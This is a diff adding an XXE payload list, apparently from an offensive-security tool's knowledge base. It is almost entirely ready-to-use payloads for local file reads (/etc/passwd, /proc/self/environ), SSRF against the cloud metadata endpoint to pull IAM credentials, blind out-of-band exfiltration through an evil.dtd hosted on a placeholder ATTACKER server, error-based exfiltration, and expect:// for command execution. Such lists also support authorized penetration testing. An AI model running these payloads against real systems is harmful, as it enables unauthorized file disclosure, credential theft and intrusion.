@@ -1,0 +1,59 @@
+# XXE (XML External Entity) Payloads
+# WardenStrike Knowledge Base
+
+# Basic file read
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
+
+# Windows file read
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>
+
+# PHP wrapper base64
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>
+
+# SSRF via XXE
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>
+
+# SSRF to internal service
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://internal.corp/admin">]><root>&xxe;</root>
+
+# Blind XXE via out-of-band (OOB)
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://BURP_COLLABORATOR/"> %xxe;]>
+
+# Blind XXE exfiltrate via DTD
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd"> %dtd;]>
+
+# evil.dtd content (host on attacker server):
+# <!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER/?x=%file;'>"> %all; %send;
+
+# CDATA bypass for special chars
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % start "<![CDATA["><!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % end "]]>"><!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd"> %dtd;]>
+
+# XInclude attack (when you can't control DOCTYPE)
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+# SVG file upload XXE
+<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>
+
+# Office document XXE (docx/xlsx word/_rels/*.xml)
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER/xxe">]><foo>&xxe;</foo>
+
+# Error-based XXE exfiltration
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///DOESNOTEXIST/%file;'>"> %eval; %error;]>
+
+# /proc/self/environ (env variables with secrets)
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>
+
+# /proc/self/cmdline
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/self/cmdline">]><root>&xxe;</root>
+
+# AWS metadata via XXE SSRF
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><root>&xxe;</root>
+
+# Jar URI scheme (Java)
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "jar:http://ATTACKER/evil.jar!/file">]><root>&xxe;</root>
+
+# Expect URI (RCE if expect loaded)
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>
+
+# Netdoc URI
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]><root>&xxe;</root>
